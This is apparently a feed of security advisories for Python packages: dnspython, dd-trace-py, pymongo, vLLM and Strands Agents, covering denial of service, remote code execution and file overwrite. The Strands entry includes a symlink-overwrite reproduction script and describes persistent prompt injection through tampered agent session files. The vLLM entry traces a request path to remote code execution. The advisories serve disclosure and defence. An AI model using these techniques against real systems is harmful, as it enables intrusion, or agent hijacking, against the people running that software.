items.summary: ImpactA maliciously crafted DNS message may cause dns.name.from_wire_parser() to use excessive CPU for DNS name decompression.  Applications that process untrusted DNS wire form messages with dnspython may be degraded or DoS'd by the extra CPU use required.PatchesThis problem is fixed in dnspython 2.9.0.WorkaroundsThere are no known workarounds.CreditEvgenios Gkritsis, Department of Informatics, University of Piraeus & Athena Research Center, GreeceConstantinos Patsakis, Department of Informatics, University of Piraeus & Athena Research Center, GreeceGeorge Stergiopoulos, Department of Informatics, Athens University of Economics and Business, GreeceReferenceshttps://github.com/rthalley/dnspython/security/advisories/GHSA-45c3-73f7-pv4mhttps://nvd.nist.gov/vuln/detail/CVE-2026-114605https://github.com/rthalley/dnspython/commit/b485e460c266540a1a09ca6d8d1d7b685b1d3023https://github.com/rthalley/dnspython/releases/tag/v2.9.0https://github.com/advisories/GHSA-45c3-73f7-pv4m

items.title: [ddtrace] Datadog dd-trace-py: ReDoS in URL query string obfuscation
items.summary: SummaryA regular expression used to obfuscate URL query strings can consume excessive CPU when processing certain attacker-controlled input. This can stall request processing and cause denial of service in applications using affected HTTP tracing integrations.DetailsThe default query-string obfuscation pattern can exhibit excessive backtracking. The pattern is applied synchronously when recording HTTP URL metadata, allowing query-string processing to occupy application resources for an extended period.As a workaround, set both DD_TRACE_OBFUSCATION_QUERY_STRING_REGEXP and DD_TRACE_OBFUSCATION_QUERY_STRING_PATTERN to the fixed Python-compatible regex below, then restart the application. Setting both variables covers all affected ddtrace versions, including releases before 1.19.0.export DD_TRACE_OBFUSCATION_QUERY_STRING_REGEXP='(?i)(?:(?:"|%22)?)(?:(?:old[-_]?|new[-_]?)?p(?:ass)?w(?:or)?d(?:1|2)?|pass(?:[-_]?phrase)?|secret|(?:api[-_]?|private[-_]?|public[-_]?|access[-_]?|secret[-_]?|app(?:lication)?[-_]?)key(?:[-_]?id)?|token|consumer[-_]?(?:id|key|secret)|sign(?:ed|ature)?|auth(?:entication|orization)?)(?:(?:\s|%20)*(?:=|%3D)[^&]+|(?:"|%22)(?:\s|%20)*(?::|%3A)(?:\s|%20)*(?:"|%22)(?:%2[^2]|%[^2]|[^"%])+(?:"|%22))|(?:bearer(?:\s|%20)+[a-z0-9._\-]+|token(?::|%3A)[a-z0-9]{13}|gh[opsu]_[0-9a-zA-Z]{36}|(?:(?<![\w-])|(?<=%[0-9a-f]{2}))ey[I-L][\w-]+(?:=|%3D)*\.ey[I-L][\w-]+(?:=|%3D)*(?:\.(?:[\w.+/=-]|%3D|%2F|%2B)+)?|-{5}BEGIN(?:[a-z\s]|%20)+PRIVATE(?:\s|%20)KEY-{5}[^\-]+-{5}END(?:[a-z\s]|%20)+PRIVATE(?:\s|%20)KEY(?:-{5})?(?:\n|%0A)?|(?:ssh-(?:rsa|dss)|ecdsa-[a-z0-9]+-[a-z0-9]+)(?:\s|%20|%09)+(?:[a-z0-9/.+]|%2F|%5C|%2B){100,}(?:=|%3D)*(?:(?:\s|%20|%09)+[a-z0-9._-]+)?)'export DD_TRACE_OBFUSCATION_QUERY_STRING_PATTERN="$DD_TRACE_OBFUSCATION_QUERY_STRING_REGEXP"Proof of conceptDetailed triggering inputs and reproduction steps are omitted from this advisory. The patched version includes regression coverage for the affected behavior.ImpactRegular expression denial of service (ReDoS) affecting applications that process attacker-controlled URL query strings through the vulnerable obfuscation pattern. Successful exploitation can cause excessive CPU consumption, prolonged request latency, and service unavailability.The vulnerable processing is enabled by default for affected HTTP integrations that include query strings in URL span tags.Referenceshttps://github.com/DataDog/dd-trace-py/security/advisories/GHSA-3633-r77q-h3v3https://nvd.nist.gov/vuln/detail/CVE-2026-116588https://github.com/DataDog/dd-trace-py/pull/20857https://github.com/DataDog/dd-trace-py/pull/20862https://github.com/DataDog/dd-trace-py/pull/20880https://github.com/DataDog/dd-trace-py/commit/63ddc3cb07d8813ded7a8b3ab5b8d0f5470e4bfdhttps://github.com/DataDog/dd-trace-py/commit/83ea39845dd95bfb9b8e247c62b3d22fc5dce1cehttps://github.com/DataDog/dd-trace-py/commit/a6d73607ea45ecd67152630f64b0945556972ed8https://github.com/DataDog/dd-trace-py/releases/tag/v3.19.9https://github.com/DataDog/dd-trace-py/releases/tag/v4.15.6https://github.com/advisories/GHSA-3633-r77q-h3v3

items.title: [ddtrace] Datadog dd-trace-py: IAST instrumentation can lead to application DOS
items.summary: SummaryA flaw in dd-trace-py’s IAST instrumentation can cause the Python application process to terminate unexpectedly when processing certain attacker-controlled input. Only applications with IAST enabled are affected. IAST is disabled by default.DetailsThe affected IAST string-processing instrumentation does not properly handle certain internal errors, allowing an error to terminate the application process. Exploitation requires IAST to be enabled and application code to perform an affected string-processing operation on attacker-controlled input.If you are unable to upgrade to a patched version of dd-trace-py, you can mitigate this issue by either disabling IAST (setting DD_IAST_ENABLED=false) or by replacing replace % string interpolations with str.format or f-strings for user inputs in your monitored application.Proof of conceptDetailed triggering inputs and reproduction steps are omitted from this advisory. The linked fix (#20786) includes regression coverage for the affected behavior.ImpactDenial of service affecting applications that use a vulnerable version of dd-trace-py with IAST enabled and expose the affected operation to attacker-controlled input. Successful exploitation terminates the affected Python process and interrupts the work it is handling.Referenceshttps://github.com/DataDog/dd-trace-py/security/advisories/GHSA-p3m5-h5v9-vqj6https://nvd.nist.gov/vuln/detail/CVE-2026-116589https://github.com/DataDog/dd-trace-py/pull/20786https://github.com/DataDog/dd-trace-py/pull/20823https://github.com/DataDog/dd-trace-py/commit/69dc19853247434ceab83e0c1c4e279a2eb2a3f7https://github.com/DataDog/dd-trace-py/commit/ace972489b57dd020ff52b706bb548a354f2dd69https://github.com/DataDog/dd-trace-py/releases/tag/v4.15.5https://github.com/advisories/GHSA-p3m5-h5v9-vqj6

items.title: [pymongo] MongoDB Python Driver: Out-of-bounds read in BSON decoding via a malformed Regex element
items.summary: ImpactThe C extension's BSON decoder scans a Regex element's pattern and flags strings with strlen before checking the document's remaining length, so a crafted truncated Regex element can read past the end of the caller's buffer. bson.decode and bson.decode_all accept mmap and array buffers, which carry no NUL sentinel; the read can cross into unmapped memory and kill the process with an uncatchable SIGSEGV. Any application decoding untrusted BSON from such buffers is affected — impact is availability only, since the out-of-bounds bytes are never returned as content. NUL-terminated buffers (bytes, bytearray) raise InvalidBSON at worst; the driver's own transport and pure-Python installs are not affected. All releases through 4.18.2 are affected when the C extension is loaded.PatchesFixed in PyMongo 4.18.3. Malformed Regex elements now raise InvalidBSON on every accepted buffer type; valid documents decode unchanged.WorkaroundsDecode untrusted BSON only from NUL-terminated buffers — bytes or bytearray — and copy mmap input first, e.g. bytes(mm[:size]).Referenceshttps://github.com/mongodb/mongo-python-driver/security/advisories/GHSA-98qm-wvgf-w4cfhttps://nvd.nist.gov/vuln/detail/CVE-2026-106435https://github.com/mongodb/mongo-python-driver/pull/3109https://github.com/mongodb/mongo-python-driver/commit/bb8d4e195275e75bd94ebeffb53cc747d357fcf4https://github.com/mongodb/mongo-python-driver/releases/tag/4.18.3https://jira.mongodb.org/browse/PYTHON-6110https://github.com/advisories/GHSA-98qm-wvgf-w4cf

items.title: [vllm] vLLM: Request-controlled mm_processor_kwargs.code_revision allows remote code execution
items.summary: SummaryAn untrusted multimodal request can set mm_processor_kwargs.code_revision. When vLLM serves a model whose Hugging Face processor uses dynamic auto_map code and the operator enabled --trust-remote-code, this request value reaches AutoProcessor.from_pretrained and selects the Python revision imported by Transformers.This lets a client replace the operator-reviewed processor module with code from another revision of the same model repository. The operator-selected model/data revision remains pinned; only the executed processor code changes.Importing a Python module is arbitrary code execution in the vLLM API/renderer process. The PoC below demonstrates this with an import-time filesystem write. It is fully offline and does not require a GPU, model weights, or changes to a real Hub repository.Affected snapshotRepository: vllm-project/vllmVerified commit: 570735520942b6428ae98f1eb442c6d88adae55eVerified with Transformers 5.15.0 and 5.16.1Affected release range has not been bisectedAffected configurationThe vulnerable path exists when all of the following are true:The served model's processor uses dynamic auto_map.AutoProcessor code.The operator enabled trust_remote_code.The server can fetch the request-selected revision, or it is already cached.The attacker can create or otherwise control a revision in the served model repository. An example is a Hugging Face community pull-request ref when that repository permits them.A multimodal request reaches the processor path.The default trust_remote_code=False configuration is not affected.Attack surfacemm_processor_kwargs is accepted directly by public request models:TokenizeChatRequest.mm_processor_kwargsChatCompletionRequest.mm_processor_kwargs/tokenize is particularly relevant because vLLM's authentication middleware guards only /v1, /v2, /inference, and /cohere prefixes:AuthenticationMiddlewareConsequently, /tokenize remains unauthenticated even when --api-key is configured, unless an external proxy protects it. The vLLM Security Guide documents /tokenize as an unprotected endpoint.Root causeThe request value follows this path:OnlineRenderer.preprocess_chat places request mm_processor_kwargs in prompt extras.Multimodal rendering forwards those kwargs into processor construction through MMProcessorInputs and _process_multimodal_async.MultiModalConfig.merge_mm_processor_kwargs overlays inference values on startup values, so the request wins.cached_get_processor_without_dynamic_kwargs filters only recognized processor-call keys. code_revision is retained as a processor-construction kwarg.cached_processor_from_config pins revision and trust_remote_code, but forwards the remaining kwargs without reserving code_revision.get_processor calls AutoProcessor.from_pretrained(..., revision=revision, trust_remote_code=trust_remote_code, **kwargs).Transformers AutoProcessor.from_pretrained uses code_revision to retrieve and import the dynamic module through get_class_from_dynamic_module, then removes it before loading processor data. This is why code comes from the attacker revision while configuration/data remain operator-pinned.Request-time processor arguments are not separated from processor-construction arguments, and code_revision is not reserved.Suggested remediationSeparate processor-construction arguments from untrusted processor-call arguments. An allowlist of supported request-time preprocessing controls is safest.Reject code_revision and other loader/source controls in request mm_processor_kwargs, and pass model_config.code_revision explicitly as the only permitted processor-code revision.Add a regression test proving a request cannot change the loaded module revision while operator pins remain effective.Protect /tokenize with the configured authentication policy as defense in depth.Expected safe behavior is either a 4xx response for reserved request keys or silently ignoring them before processor construction. Rejection is preferable because it makes attempted misuse visible.A patch for this was merged here: https://github.com/vllm-project/vllm/pull/58830Referenceshttps://github.com/vllm-project/vllm/security/advisories/GHSA-h3rc-6mm3-gc2mhttps://github.com/vllm-project/vllm/pull/58830https://github.com/vllm-project/vllm/commit/31f2e70cd3e403aaa471fb7fe3d33a7207aaf3cchttps://github.com/vllm-project/vllm/releases/tag/v0.31.0https://nvd.nist.gov/vuln/detail/cve-2026-114053https://www.vulncheck.com/advisories/vllm-0.7.3-before-0.31.0-rce-via-mm-processor-kwargs-code-revisionhttps://github.com/advisories/GHSA-h3rc-6mm3-gc2m

items.title: [vllm] Duplicate Advisory: vLLM: Request-controlled mm_processor_kwargs.code_revision allows remote code execution
items.summary: Duplicate AdvisoryThis advisory has been withdrawn because it is a duplicate of GHSA-h3rc-6mm3-gc2m. This link is maintained to preserve external references.Original DescriptionvLLM from 0.7.3 before 0.31.0 forwards the request-supplied mm_processor_kwargs.code_revision to Transformers AutoProcessor.from_pretrained, letting clients select which revision of a model's dynamic processor code is imported when trust_remote_code is enabled. items.title: [strands-agents] Strands Agents: Local Privilege Escalation via Symlink Attack in Default Session File Storage
items.summary:
SummaryThe FileSessionManager defaults to storing session data in /tmp/strands/sessions/ (a world-writable directory) using predictable file paths and a write pattern (open(path + ".tmp", "w") → os.replace()) that follows symbolic links. A local attacker can exploit this to overwrite arbitrary files or inject malicious session data for persistent prompt injection.Vulnerability DetailsComponent: strands-py/src/strands/session/file_session_manager.pyRoot Cause:Default storage directory is tempfile.gettempdir() + "/strands/sessions/" (line 58) — resolves to /tmp/strands/sessions/ on Linux/macOSThe _write_file() method (lines 116-123) writes to a predictable .tmp path without symlink protection:tmp = f"{path}.tmp"with open(tmp, "w", encoding="utf-8", newline="
") as f:    json.dump(data, f, indent=2, ensure_ascii=False)os.replace(tmp, path)open() follows symlinks — a pre-placed symlink at the .tmp path causes writes to an arbitrary target fileNo integrity verification (HMAC/signature) on session files — tampered data is loaded as-isAttack Vectors1. Arbitrary File Overwrite (Local Privilege Escalation)Attacker pre-creates /tmp/strands/sessions/session_<id>/ (or monitors for new directories via inotify)Attacker creates a symlink: session.json.tmp → /home/victim/.bashrc (or any writable file)Victim application writes session data → follows symlink → overwrites target file with JSON contentAttacker achieves code execution on next shell login (or targets .ssh/authorized_keys, cron files, etc.)2. Persistent Prompt Injection via Session TamperingAttacker writes crafted message files into the session directoryVictim application restores the session → loads attacker-controlled conversation historyInjected messages instruct the agent to execute attacker commands on every future interactionNo integrity check prevents this — the SDK trusts all session files at face valueImpactArbitrary file overwrite — local attacker can write attacker-controlled content to any file writable by the victim processLocal privilege escalation — via overwriting shell configs, SSH keys, cron jobs, or systemd user servicesPersistent agent compromise — via session data injection, the agent follows attacker instructions indefinitelyReproductionimport os, json, tempfile, shutil# Setup: simulate the vulnerable write patternsession_dir = "/tmp/strands/sessions/session_test/"os.makedirs(session_dir, exist_ok=True)# Attacker: create symlink at the .tmp write pathtarget_file = "/tmp/symlink_attack_proof.txt"with open(target_file, "w") as f:    f.write("ORIGINAL - should not be overwritten
")symlink_path = os.path.join(session_dir, "session.json.tmp")if os.path.exists(symlink_path):    os.unlink(symlink_path)os.symlink(target_file, symlink_path)# Victim: FileSessionManager._write_file() equivalentwith open(symlink_path, "w", encoding="utf-8", newline="
") as f:    json.dump({"session_id": "test", "injected": True}, f, indent=2)# Verify: target file overwrittenwith open(target_file) as f:    print(f"Target file content: {f.read()}")    # Output: {"session_id": "test", "injected": true}# Cleanupos.unlink(symlink_path)os.unlink(target_file)shutil.rmtree(session_dir)Suggested FixUse a user-private default directory — ~/.strands/sessions/ or $XDG_DATA_HOME/strands/sessions/ instead of /tmp/Use os.open() with O_NOFOLLOW | O_CREAT | O_WRONLY — refuses to follow symlinksUse tempfile.mkstemp() for atomic writes instead of predictable .tmp suffixVerify directory ownership matches the current user before writingAdd optional integrity verification (HMAC) on session files to detect tamperingReferenceshttps://github.com/strands-agents/harness-sdk/security/advisories/GHSA-3w55-933p-8pv5https://github.com/strands-agents/harness-sdk/pull/2937https://github.com/strands-agents/harness-sdk/commit/8658b9e0d57427b77b69343262184d76d8e63e8fhttps://github.com/strands-agents/harness-sdk/releases/tag/python/v1.48.0https://github.com/advisories/GHSA-3w55-933p-8pv5
